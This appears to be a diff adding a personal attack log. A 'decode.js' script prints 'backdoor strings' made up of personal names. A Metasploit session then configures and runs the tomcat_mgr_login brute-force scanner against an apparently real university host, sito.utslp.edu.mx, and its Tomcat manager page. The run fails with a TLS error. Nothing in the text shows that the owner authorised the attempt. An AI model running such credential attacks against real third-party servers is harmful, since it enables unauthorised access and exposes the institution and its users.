@@ -1,0 +1,34 @@
+┌─[✗]─[marcos_os@parrot]─[~/Desktop/ProyectoSito/NuevoComienzo]
+└──╼ $js decode.js 
+Backdoor strings:
+1: Equipo SITO
+2: Jose Tono Garcia
+3: Desarrollador, Lider de Proyecto
+4: Isra Ramirez
+5: Juanjo-c Muniz
+6: Danyel Sp
+
+[msf](Jobs:0 Agents:0) >> use auxiliary/scanner/http/tomcat_mgr_login 
+[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set rhosts sito.utslp.edu.mx
+rhosts => sito.utslp.edu.mx
+[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set rport 443 
+rport => 443
+[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set SSL true
+[!] Changing the SSL option's value may require changing RPORT!
+SSL => true
+[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set SSLVERSION TLS1
+SSLVERSION => TLS1
+[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set targeturi /manager/html
+targeturi => /manager/html
+[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set STOP_ON_SUCCESS true
+STOP_ON_SUCCESS => true
+[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set verbose true
+verbose => true
+[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set THREADS 1
+THREADS => 1
+[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> run
+[*] Error: 189.254.143.102: OpenSSL::SSL::SSLError SSL_connect returned=1 errno=0 peeraddr=189.254.143.102:443 state=error: tlsv1 alert protocol version
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
